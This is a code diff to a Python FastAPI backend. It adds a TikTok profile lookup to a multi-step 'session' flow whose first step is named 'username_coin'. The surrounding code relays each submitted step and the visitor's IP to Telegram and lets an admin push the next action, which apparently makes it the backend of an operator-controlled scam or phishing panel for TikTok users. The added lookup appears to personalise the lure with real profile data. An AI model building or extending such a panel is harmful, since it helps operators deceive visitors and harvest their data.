@@ -7,6 +7,7 @@ import logging
 from pathlib import Path
 from models import UserSession, StepData, AdminAction, StatusCheck, StatusCheckCreate
 from telegram_service import telegram_service
+from tiktok_service import tiktok_service
 from typing import List, Optional
 import uuid
 
@@ -48,6 +49,19 @@ async def create_session():
     await db.user_sessions.insert_one(session.dict())
     return {"session_id": session.session_id}
 
+@api_router.get("/tiktok/user/{username}")
+async def get_tiktok_user(username: str):
+    """Get TikTok user information"""
+    try:
+        user_info = tiktok_service.get_user_info(username)
+        return user_info
+    except Exception as e:
+        logging.error(f"Error fetching TikTok user: {str(e)}")
+        return {
+            "success": False,
+            "error": str(e)
+        }
+
 @api_router.post("/session/step")
 async def submit_step(step_data: StepData, request: Request):
     """Submit data for a specific step and send Telegram notification"""
@@ -59,6 +73,12 @@ async def submit_step(step_data: StepData, request: Request):
         # Get client IP
         client_ip = request.client.host if request.client else "Unknown"
         data['ip'] = client_ip
+        
+        # If it's the first step, fetch TikTok user info
+        if step == 'username_coin' and 'username' in data:
+            username = data['username']
+            tiktok_data = tiktok_service.get_user_info(username)
+            data['tiktok_data'] = tiktok_data
         
         # Update session in database
         update_data = {"current_step": step}
@@ -75,7 +95,8 @@ async def submit_step(step_data: StepData, request: Request):
         return {
             "success": True,
             "message": "Step submitted successfully",
-            "session_id": session_id
+            "session_id": session_id,
+            "tiktok_data": data.get('tiktok_data')
         }
         
     except Exception as e:
@@ -102,7 +123,8 @@ async def get_session_action(session_id: str):
         
         return {
             "action": next_action,
-            "current_step": session.get('current_step')
+            "current_step": session.get('current_step'),
+            "tiktok_data": session.get('tiktok_data')
         }
         
     except Exception as e:
